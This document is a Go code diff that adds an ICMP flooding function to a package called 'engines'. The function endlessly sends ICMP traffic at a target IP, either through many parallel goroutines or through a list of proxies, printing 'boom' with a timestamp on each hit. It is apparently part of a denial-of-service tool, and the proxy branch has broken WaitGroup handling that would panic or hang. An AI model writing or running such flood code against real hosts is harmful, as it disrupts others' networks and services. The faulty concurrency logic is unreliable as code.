@@ -3,6 +3,10 @@ package engines
 import (
 	"fmt"
 	"net"
+	"sync"
+	"time"
+
+	"runtime"
 
 	"golang.org/x/net/icmp"
 	"golang.org/x/net/ipv4"
@@ -121,5 +125,45 @@ func icmp_proxy_handler(ip string, proxy string) error {
 	fmt.Printf("Received ICMP echo response from %v: %+v\n", dstIP.String(), respMsg)
 
 	return nil
+
+}
+
+func Icmp(ip string, proxys []string, cpu int) {
+	if len(proxys) == 0 {
+		runtime.GOMAXPROCS(runtime.NumCPU())
+		for {
+			var wg sync.WaitGroup
+			for i := 0; i < cpu; i++ {
+				wg.Add(1)
+				go func() {
+					//use func handler
+					code := icmp_handler(ip)
+					fmt.Println(code, " boom :", time.Now().Format("15:04:05.000"))
+					wg.Done()
+				}()
+			}
+			wg.Wait()
+			fmt.Println("All threads are dead, restarting")
+		}
+	}
+
+	if len(proxys) > 0 {
+		runtime.GOMAXPROCS(cpu)
+		wg := sync.WaitGroup{}
+		for {
+			wg.Add(1)
+			for _, proxy := range proxys {
+				var wg sync.WaitGroup
+				go func() {
+					//use func handler
+					code := icmp_proxy_handler(ip, proxy)
+					fmt.Println(code, " boom :", time.Now().Format("15:04:05.000"))
+					wg.Done()
+				}()
+				fmt.Println("All threads are dead, restarting")
+			}
+			wg.Wait()
+		}
+	}
 
 }
